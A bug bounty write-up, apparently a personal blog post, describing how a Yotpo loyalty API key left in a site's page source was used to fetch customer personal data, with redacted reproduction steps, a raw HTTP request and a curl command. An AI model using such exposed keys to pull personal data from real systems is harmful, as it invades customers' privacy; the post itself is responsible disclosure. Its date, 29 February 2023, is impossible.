---
title: 'From an Innocent api-key to PII data'
metaTitle: 'From an Innocent api-key to PII data'
metaDesc: 'dev@jijo:~$whoami'
socialImage: images/apikey.png
date: '2023-02-29'
tags:
  - second critical bug
---

# From an Innocent api-key to PII data

## How we got there

It was on a thursday of february 2023, i had just gotten of driving and i was feeling tired, at the same time i was feeling `meh` since i had not done any good hacking that week, just doing random stuffs. so i took out my laptop sat on the coach and hopped on [intigriti](https://app.intigriti.com/researcher) and started looking around on the `recently update` category as i sometimes do. I found this program that had updated the scope, lets call it jij0 [you know the drill my returning readers](/post/why) and i decided to tap into it lightly.

i enumerated subdomains, got several hits, i decided since they weren't many subdomains i should just visit them one by one and check if maybe i could find anything.
i visted one `https://customers.jij0.me/` that seemed prety normal, login and signup and a web shop but nothing really interesting to poke around at. I did my usual poking around with the `view-source:` so i could check out the js files for any hardcorded creds, tokens or api-keys. i found some config data inside a script tag;

```javascript
<script> REDACTED... apiurl":"https://customers.jij0.me/v2","env":"prod","YOTPO-MERCHANT-ID":"XXXXX","YOTPO-API-KEY":"API_KEY_HERE","YOTPO-GUID":"GUID_HERE"  ...REDACTED </script>
```

at first i didn't think much of these keys as they seemed not interesting at all, but i decided to check online for any exploitation on api keys from yotpo but my search returned nothing.

I was about to give up when i remembered that most companies have `dev documentations`. so i googled `yotpo developer documentation`, after a few readings here and there i found this documentation page [Loyalty Docs](https://loyaltyapi.yotpo.com/reference). Turns out the api-keys i found earlier were for the loyalty api, and the juicy part was that the same api keys were the `auth keys`. Bingo. after some more digging i found that i could query customer data associated with the api keys [Get Customers Docs](https://loyaltyapi.yotpo.com/reference/fetch-all-recently-updated-customers), super bingo.

>TIP of the day :: Just because it hasn't been exploited and documented publicly, doesn't mean it isn't vulnerable... Everything is vulnerable unless proven otherwise.

So after reading the docs i crafted the following burp request to the api with the exposed api keys, and boom 'PII'.

I stopped testing here.

```bash
GET /api/v2/customers/recent?per_page=100 HTTP/2
Host: loyalty.yotpo.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
X-Guid: GUID_HERE
X-Api-Key: API_KEY_HERE
```

## Reproduction Steps

1. Visit <https://customers.jij0.me/>
2. Perform a view-source, either by rightclicking or ctrl + u (cmd + u [mac users])
3. Scroll down to the bottom to find

```javascript
<script> REDACTED... apiurl":"https://customers.jij0.me/v2","env":"prod","YOTPO-MERCHANT-ID":"XXXXX","YOTPO-API-KEY":"API_KEY_HERE","YOTPO-GUID":"GUID_HERE"  ...REDACTED </script>
```

4. VIsit <https://loyalty.yotpo.com/api/v2/customers/recent?per_page=100> and intercept with burp
5. Send request from 4 to repeater and send it to observe the 401 error
Alter the request to be;

```bash
GET /api/v2/customers/recent?per_page=100 HTTP/2
Host: loyalty.yotpo.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
X-Guid: GUID_HERE
X-Api-Key: API_KEY_HERE
```

6. send request

## Quick Curl Repro Command

```bash
curl -i -s -k -X $'GET' \
-H $'Host: loyalty.yotpo.com' -H $'Accept: application/json' -H $'X-Guid: GUID_HERE' -H $'X-Api-Key: API_KEY_HERE' \
$'https://loyalty.yotpo.com/api/v2/customers/recent?per_page=100'
```

So i wrote  a report and sent it to the program at intigriti. The report was triaged as a critical.

After waiting for a few days i recieved a €200 bonus.

![basic](/images/poc/yotpo.png)

## Contacts

### @[github](https://github.com/crypt0g30rgy)  @[twitter](https://twitter.com/crypt0g30rgy) @[LinkedIn](https://www.linkedin.com/in/george-maina-waithaka-95a465214/)   @[Intigriti](https://app.intigriti.com/profile/g30rgyth3d4rk) @[hackerone_old](https://hackerone.com/crypt0p3n3tr4t0r?type=user)
